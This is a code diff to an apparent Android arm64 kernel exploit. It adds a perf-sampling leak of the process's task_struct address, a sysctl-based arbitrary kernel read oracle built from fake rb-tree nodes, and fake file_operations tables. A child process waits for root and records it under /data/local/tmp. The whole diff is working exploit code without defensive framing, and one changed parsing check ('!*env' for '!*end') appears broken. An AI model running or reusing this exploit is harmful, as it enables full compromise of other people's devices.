@@ -1,6 +1,8 @@
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
 
+#include <linux/perf_event.h>
+
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
@@ -15,6 +17,10 @@ static struct mm_ctx spray_ctx;
 static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
+static int slide_hold_only;
+uintptr_t slide_hold_mm;
+pid_t slide_hold_child = -1;
+static int slide_hold_memfd = -1;
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static int rmg_fast_profile_enabled(void) {
@@ -244,7 +250,8 @@ int select_slide_payload_index(size_t index) {
      * the boot_id sysctl ctl_table entry (KASLR-computable), giving an
      * arbitrary-read oracle via /proc/sys/kernel/random/boot_id.  This is
      * strictly less reclaim than the FAKE_TASK path (2 objects -> 1). */
-    fake_task = SLIDE_INIT_TASK + slide_p0_offset;
+    /* Walk VAs must be slid kimage, not P0 aliases (RWC:83). */
+    fake_task = text_addr(INIT_TASK);
     fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
                 index * SLIDE_BANK_SLOT_STRIDE;
     fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
@@ -264,16 +271,22 @@ int select_slide_payload_index(size_t index) {
      * (= DIRECT_BOOTID_ADDR Q, default nfulnl_logger) is the value written.
      * boot_id then reads the 16 bytes at Q = a true arbitrary read, still on
      * the SAME reliable 1-object fake_lock reclaim. */
-    slide_oracle_target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR +
-                          slide_p0_offset;
-    uintptr_t q = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
+    if (getenv("DIRECT_BOOTID_BOOTID")) {
+      slide_oracle_target =
+          data_addr(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE);
+    } else {
+      /* uuid.ctl_table.data is NULL — retargeting it does not destroy
+       * boot_id.  /proc/sys/kernel/random/uuid then reads 16 bytes at Q. */
+      slide_oracle_target = data_addr(SLIDE_RANDOM_UUID_DATA_IMAGE);
+    }
+    uintptr_t q = text_addr(INIT_TASK);
     const char *addr_arg = getenv("DIRECT_BOOTID_ADDR");
     if (addr_arg && *addr_arg) {
       char *end = NULL;
       errno = 0;
       unsigned long long v = strtoull(addr_arg, &end, 0);
       if (!errno && end != addr_arg && !*end && !(v & 7)) {
-        q = (uintptr_t)v;
+        q = resolve_kernel_va((uintptr_t)v);
       }
     }
     if (getenv("DIRECT_FOPS_OWNER_CLEAR")) {
@@ -288,10 +301,10 @@ int select_slide_payload_index(size_t index) {
       fake_fops = slide_bank_payload_base + 0x1000;
       fake_lock = slide_bank_payload_base + 0x1180;
       fake_w0 = slide_bank_payload_base + 0x11c0;
-      slide_oracle_target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR +
-                            slide_p0_offset;
+      slide_oracle_target =
+          data_addr(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE);
       slide_oracle_parent = slide_oracle_target - 0x10;
-      slide_oracle_child = slide_bank_payload_base + FOPS_RECLAIM_PROBE_OFF;
+      slide_oracle_child = fake_fops;
     } else if (getenv("DIRECT_FOPS_WRITE")) {
       q = kaslr_image_addr(ASHMEM_MISC_FOPS);
       fake_fops = slide_bank_payload_base + 0x1000;
@@ -348,9 +361,28 @@ int select_slide_payload_index(size_t index) {
       slide_oracle_parent = q;
       slide_oracle_child = 0;
     } else if (getenv("DIRECT_BOOTID_CHILD")) {
-      /* parent = ctl_table.data - 0x10 -> parent->rb_left == &ctl_table.data.
-       * Waiter must be parent's LEFT child and have one child = Q. */
-      slide_oracle_parent = slide_oracle_target - 0x10;
+      /* rb_erase one-right-empty path (vmlinux +0x84): dest is parent+8
+       * when parent->rb_left != waiter. parent = data-8 makes dest = data. */
+      slide_oracle_parent = slide_oracle_target - 8;
+      if (getenv("DIRECT_TASK_NEWEST")) {
+        if (addr_arg == NULL) {
+          q = text_addr(INIT_TASK) + TASK_TASKS_OFF;
+        } else if (addr_arg[0] == 0) {
+          q = text_addr(INIT_TASK) + TASK_TASKS_OFF;
+        }
+      } else if (getenv("DIRECT_HOLD_MM")) {
+        if (slide_hold_mm) {
+          if (addr_arg == NULL) {
+            q = slide_hold_mm + MM_IOCTX_TABLE_OFF;
+          } else if (addr_arg[0] == 0) {
+            q = slide_hold_mm + MM_IOCTX_TABLE_OFF;
+          }
+        }
+      } else if (getenv("DIRECT_MM_OWNER")) {
+        if (slide_leaked_mm) {
+          q = slide_leaked_mm + MM_IOCTX_TABLE_OFF;
+        }
+      }
       slide_oracle_child = q;
     } else {
       slide_oracle_parent = slide_oracle_target;
@@ -712,8 +744,23 @@ uintptr_t text_addr(uintptr_t image_addr) {
   return kaslr_image_addr(image_addr);
 }
 
+uintptr_t slide_leaked_mm;
+
 uintptr_t slide_canon_addr(uintptr_t data_alias) {
   return kaslr_base + p0_alias_image_offset(data_alias);
+}
+
+uintptr_t resolve_kernel_va(uintptr_t v) {
+  /* Unslid kimage and slid kimage overlap when the slide is small
+   * (INIT_TASK 0xffffffc00a24f8c0 sits inside kaslr_base+64MiB). Treat
+   * every VA in the unsild image window as an image address. */
+  if ((v & 0xffffffff00000000ULL) == P0_PAGE_OFFSET) {
+    return slide_canon_addr(v);
+  }
+  if (v >= KIMAGE_TEXT_BASE && v < KIMAGE_TEXT_BASE + 0x04000000ULL) {
+    return kaslr_image_addr(v);
+  }
+  return v;
 }
 
 uintptr_t canon_addr(uintptr_t image_addr) {
@@ -790,11 +837,121 @@ int exploit_core(void) {
     char *end = NULL;
     errno = 0;
     long value = strtol(env, &end, 0);
-    if (!errno && end != env && !*end && value >= 0 && value < 32) {
+    if (!errno && end != env && !*env && value >= 0 && value < 32) {
       return (int)value;
     }
   }
   return CORE;
+}
+
+/* perf_find_task_self - leak THIS process's task_struct VA without any
+ * kernel list walk (GhostLock perf_find_task, self-sampling variant).
+ * A per-task SOFTWARE CPU_CLOCK event samples PERF_SAMPLE_REGS_INTR while
+ * we spin in syscalls; on this arm64 kernel current is carried in a GPR
+ * across the syscall path (current = SP_EL0), so the most-frequent physmap
+ * VA across all interrupt register dumps is our own task_struct.  The
+ * VMAP-stack pointer is excluded by the range filter (< physmap base).
+ * Returns 0 on failure.  Validate the result with a pid read before use. */
+uintptr_t perf_find_task_self(void) {
+  struct perf_event_attr pe;
+  memset(&pe, 0, sizeof(pe));
+  pe.type = PERF_TYPE_SOFTWARE;
+  pe.size = sizeof(pe);
+  pe.config = PERF_COUNT_SW_CPU_CLOCK;
+  pe.sample_period = 5000;
+  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+  pe.sample_regs_intr = 0xffffffffULL;
+  pe.disabled = 1;
+  pe.exclude_user = 1;
+  pe.exclude_hv = 1;
+  pe.exclude_idle = 1;
+
+  errno = 0;
+  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+  if (fd < 0) {
+    pr_warning("perf self perf_event_open failed errno=%d\n", errno);
+    return 0;
+  }
+  size_t msz = 4096 * (1 + 32);
+  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+  if (buf == MAP_FAILED) {
+    pr_warning("perf self mmap failed errno=%d\n", errno);
+    close(fd);
+    return 0;
+  }
+  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+  for (volatile int i = 0; i < 500000; i++) {
+    syscall(__NR_getpid);
+  }
+  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+
+  struct perf_event_mmap_page *hdr = buf;
+  uint64_t head = hdr->data_head;
+  __sync_synchronize();
+  char *base = (char *)buf + 4096;
+  size_t dsz = 4096 * 32;
+  uint64_t pos = hdr->data_tail;
+  uintptr_t cands[512];
+  int nc = 0;
+  while (pos < head && nc < 512) {
+    struct perf_event_header *ev = (void *)(base + (pos % dsz));
+    if (ev->size == 0 || ev->size > dsz) {
+      break;
+    }
+    if (ev->type == PERF_RECORD_SAMPLE) {
+      char *p = (char *)ev + sizeof(*ev);
+      p += 8; /* skip IP */
+      uint64_t abi = *(uint64_t *)p;
+      p += 8;
+      if ((abi == 1 || abi == 2) &&
+          (size_t)(ev->size) >= sizeof(*ev) + 16 + 32 * 8) {
+        uint64_t *regs = (uint64_t *)p;
+        for (int i = 0; i < 32 && nc < 512; i++) {
+          uint64_t v = regs[i];
+          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL) {
+            cands[nc++] = v;
+          }
+        }
+      }
+    }
+    pos += ev->size;
+  }
+  hdr->data_tail = head;
+  munmap(buf, msz);
+  close(fd);
+  if (!nc) {
+    pr_warning("perf self: no kernel-VA candidates in samples\n");
+    return 0;
+  }
+
+  /* Vote: most frequent candidate wins.  Log the top 3 for forensics. */
+  uintptr_t best = 0, second = 0, third = 0;
+  int best_cnt = 0, second_cnt = 0, third_cnt = 0;
+  for (int i = 0; i < nc; i++) {
+    if (cands[i] == best || cands[i] == second || cands[i] == third) {
+      continue;
+    }
+    int cnt = 0;
+    for (int j = i; j < nc; j++) {
+      if (cands[j] == cands[i]) {
+        cnt++;
+      }
+    }
+    if (cnt > best_cnt) {
+      third = second; third_cnt = second_cnt;
+      second = best; second_cnt = best_cnt;
+      best = cands[i]; best_cnt = cnt;
+    } else if (cnt > second_cnt) {
+      third = second; third_cnt = second_cnt;
+      second = cands[i]; second_cnt = cnt;
+    } else if (cnt > third_cnt) {
+      third = cands[i]; third_cnt = cnt;
+    }
+  }
+  pr_info("perf self task: %016zx (%d/%d votes) second=%016zx (%d) "
+          "third=%016zx (%d)\n",
+          best, best_cnt, nc, second, second_cnt, third, third_cnt);
+  return best;
 }
 
 pid_t clone_child(void) {
@@ -825,6 +982,41 @@ pid_t clone_leak_child(void) {
   return child;
 }
 
+static pid_t clone_hold_child(void) {
+  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
+  if (child == 0) {
+    if (!getenv("HOLD_LEAK_ONLY")) {
+      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+      if (getppid() == 1) {
+        _exit(1);
+      }
+    }
+    for (int fd = 3; fd < 256; fd++) {
+      close(fd);
+    }
+    kernelsnitch_find_collisions(ks);
+    for (int fd = 3; fd < 1024; fd++) {
+      close(fd);
+    }
+    for (;;) {
+      if (getuid() == 0) {
+        int out = open("/data/local/tmp/hold-root", O_WRONLY | O_CREAT | O_TRUNC,
+                       0644);
+        if (out >= 0) {
+          (void)write(out, "uid0\n", 5);
+          close(out);
+        }
+        break;
+      }
+      usleep(50000);
+    }
+    for (;;) {
+      pause();
+    }
+  }
+  return child;
+}
+
 int open_memfd(pid_t child) {
   char path[64];
   snprintf(path, sizeof(path), "/proc/%d/mem", child);
@@ -835,8 +1027,12 @@ void kill_child(pid_t child) {
   if (child <= 0) {
     return;
   }
-  SYSCHK(kill(child, SIGKILL));
-  SYSCHK(waitpid(child, NULL, 0));
+  if (kill(child, SIGKILL) != 0 && errno == ESRCH) {
+    return;
+  }
+  if (waitpid(child, NULL, 0) != 0 && errno == ECHILD) {
+    return;
+  }
 }
 
 void close_reclaim_sockets(void) {
@@ -1244,8 +1440,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put64(p, LEFT_OFF + 0x08, 0);
     put64(p, LEFT_OFF + 0x10, 0);
 
+    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+      if (getenv("DIRECT_FOPS_PLANT")) {
+        put_fake_fops_table(p, FOPS_TABLE_OFF);
+      }
+    }
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
       put_fake_fops_table(p, 0x1000);
+      put64(p, 0x1000 + FOPS_OWNER_OFF, FOPS_RECLAIM_PROBE_MAGIC);
       put32(p, 0x1180, 0);
       put64(p, 0x1188, payload_base + 0x11c0);
       put64(p, 0x1190, payload_base + 0x11c0);
@@ -1268,9 +1470,6 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
                       payload_base + 0x1000,
                       text_addr(INIT_TASK), payload_base + FOPS_WRITE_LOCK_OFF,
                       SLIDE_FAKE_WAITER_PRIO);
-      put64(p, FOPS_RECLAIM_PROBE_OFF, FOPS_RECLAIM_PROBE_MAGIC);
-      put64(p, FOPS_RECLAIM_PROBE_OFF + 8, 0);
-      put64(p, FOPS_RECLAIM_PROBE_OFF + 16, 0);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(APP_FOPS_TABLE_MIRROR_OFF)
       /*
@@ -1526,12 +1725,88 @@ static void cleanup_failed_kernel_page(const char *reason) {
 
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
+  if (slide_hold_only && child_leak > 0) {
+    kill_child(child_leak);
+    child_leak = -1;
+  }
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   cleanup_page_prepare_state();
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
 #else
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SLAB_SZ;
 #endif
+  if (slide_hold_only) {
+    int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+    ks = kernelsnitch_setup(
+        MM_STRUCT_SLAB_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
+    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+      if (!getenv("KSNITCH_DEFAULT_PROFILE")) {
+        kernelsnitch_set_profile(
+            ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
+            SLIDE_KSNITCH_REPEAT_MEASUREMENT,
+            SLIDE_KSNITCH_AVERAGE);
+      }
+    }
+#endif
+    child_leak = clone_hold_child();
+    memfd_leak = open_memfd(child_leak);
+    int waited = 0;
+    while (waited < 2000) {
+      enum kernelsnitch_state st = ks->state;
+      if (st == KERNELSNITCH_COLLISIONS_FOUND) {
+        break;
+      }
+      if (st == KERNELSNITCH_COLLISIONS_NOT_FOUND) {
+        break;
+      }
+      usleep(10000);
+      waited++;
+    }
+    pr_info("hold light collisions wait ticks=%d state=%d pid=%d\n",
+            waited, (int)ks->state, (int)child_leak);
+    if (!kernelsnitch_found_collisions(ks)) {
+      pr_warning("hold light collision failed\n");
+      kill_child(child_leak);
+      child_leak = -1;
+      if (memfd_leak > 0) {
+        close(memfd_leak);
+        memfd_leak = -1;
+      }
+      return 0;
+    }
+    kernelsnitch_bruteforce(ks);
+    uintptr_t leaked = ks->mm_struct;
+    if (leaked == (uintptr_t)-1) {
+      pr_warning("hold light mm leak failed\n");
+      kill_child(child_leak);
+      child_leak = -1;
+      if (memfd_leak > 0) {
+        close(memfd_leak);
+        memfd_leak = -1;
+      }
+      return 0;
+    }
+    slide_hold_mm = leaked;
+    slide_hold_child = child_leak;
+    slide_hold_memfd = memfd_leak;
+    memfd_leak = -1;
+    child_leak = -1;
+    if (ks) {
+      kernelsnitch_cleanup(ks);
+      ks = NULL;
+    }
+    pr_info("hold light mm leaked=%016zx child=%d memfd=%d\n",
+            slide_hold_mm, (int)slide_hold_child, slide_hold_memfd);
+    {
+      FILE *hf = fopen("/data/local/tmp/hold-mm.txt", "w");
+      if (hf) {
+        fprintf(hf, "0x%zx %d\n", slide_hold_mm, (int)slide_hold_child);
+        fclose(hf);
+      }
+    }
+    return leaked;
+  }
   prepare_ctxs();
 
   skb_buf = malloc(SKB_SEND_SIZE);
@@ -1588,7 +1863,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
   }
-  child_leak = clone_leak_child();
+  if (slide_hold_only) {
+    child_leak = clone_hold_child();
+  } else {
+    child_leak = clone_leak_child();
+  }
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.childs[i] = clone_child();
   }
@@ -1610,7 +1889,24 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     kill_child(spray_ctx.childs[i]);
   }
-  SYSCHK(waitpid(child_leak, NULL, 0));
+  if (!slide_hold_only) {
+    SYSCHK(waitpid(child_leak, NULL, 0));
+  } else {
+    int waited = 0;
+    while (waited < 2000) {
+      enum kernelsnitch_state st = ks->state;
+      if (st == KERNELSNITCH_COLLISIONS_FOUND) {
+        break;
+      }
+      if (st == KERNELSNITCH_COLLISIONS_NOT_FOUND) {
+        break;
+      }
+      usleep(10000);
+      waited++;
+    }
+    pr_info("hold child collisions wait ticks=%d state=%d pid=%d\n",
+            waited, (int)ks->state, (int)child_leak);
+  }
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   log_mm_slabinfo("after-child-exit");
 #endif
@@ -1654,6 +1950,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   size_t object_index = (leaked - base) / MM_STRUCT_SZ;
+  slide_leaked_mm = leaked;
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, object_index);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
@@ -1717,10 +2014,30 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 #endif
 #else
+  slide_leaked_mm = leaked;
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, (leaked - base) / MM_STRUCT_SLAB_SZ);
 #endif
   slabinfo_diag("leak");
+  if (slide_hold_only) {
+    slide_hold_mm = leaked;
+    slide_hold_child = child_leak;
+    slide_hold_memfd = memfd_leak;
+    memfd_leak = -1;
+    child_leak = -1;
+    if (ks) {
+      kernelsnitch_cleanup(ks);
+      ks = NULL;
+    }
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+      prepare_ctx.childs[i] = -1;
+    }
+    cleanup_page_prepare_state();
+    pr_info("hold mm leaked=%016zx child=%d memfd=%d\n",
+            slide_hold_mm, (int)slide_hold_child, slide_hold_memfd);
+    return base;
+  }
   if (!prepare_skb_payload(base, payload_mode)) {
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     cleanup_failed_kernel_page("skb-payload");
@@ -2227,6 +2544,83 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
     max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
   } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
     max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
+  }
+  {
+    const char *hold_addr = getenv("DIRECT_HOLD_MM_ADDR");
+    if (hold_addr) {
+      if (*hold_addr) {
+        char *end = NULL;
+        errno = 0;
+        unsigned long long v = strtoull(hold_addr, &end, 0);
+        if (!errno) {
+          if (end != hold_addr) {
+            if (*end == 0) {
+              if ((v & 7ULL) == 0) {
+                slide_hold_mm = (uintptr_t)v;
+                pr_info("hold mm from env %016zx\n", slide_hold_mm);
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    if (getenv("DIRECT_HOLD_MM")) {
+      if (!slide_hold_mm) {
+        if (getenv("DIRECT_HOLD_AFTER")) {
+          /* leak after lock, below */
+        } else {
+    slide_hold_only = 1;
+    for (int attempt = 1; attempt <= max_attempts; attempt++) {
+      uintptr_t hold_base = prepare_kernel_page(payload_mode);
+      pr_info("hold page prepare attempt=%d/%d mm=%016zx child=%d\n",
+              attempt, max_attempts, slide_hold_mm, (int)slide_hold_child);
+      if (slide_hold_mm) {
+        break;
+      }
+      (void)hold_base;
+    }
+    slide_hold_only = 0;
+    if (!slide_hold_mm) {
+      pr_warning("hold mm leak failed\n");
+      return 0;
+    }
+        }
+      }
+    }
+  }
+  if (getenv("HOLD_LEAK_ONLY")) {
+    if (slide_hold_mm) {
+      pr_success("HOLD_LEAK_ONLY mm=%016zx child=%d file=/data/local/tmp/hold-mm.txt\n",
+                 slide_hold_mm, (int)slide_hold_child);
+      return slide_hold_mm;
+    }
+    return 0;
+  }
+  if (getenv("DIRECT_HOLD_AFTER")) {
+    uintptr_t lock_base = 0;
+    for (int attempt = 1; attempt <= max_attempts; attempt++) {
+      size_t started_ns = gettime_ns();
+      lock_base = prepare_kernel_page(payload_mode);
+      pr_info("hold-after lock prepare attempt=%d/%d base=%016zx\n",
+              attempt, max_attempts, lock_base);
+      if (lock_base) {
+        break;
+      }
+    }
+    if (!lock_base) {
+      return 0;
+    }
+    if (!slide_hold_mm) {
+      slide_hold_only = 1;
+      child_leak = -1;
+      (void)prepare_kernel_page(payload_mode);
+      slide_hold_only = 0;
+      pr_info("hold-after mm=%016zx child=%d\n",
+              slide_hold_mm, (int)slide_hold_child);
+    }
+    return lock_base;
   }
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     size_t started_ns = gettime_ns();
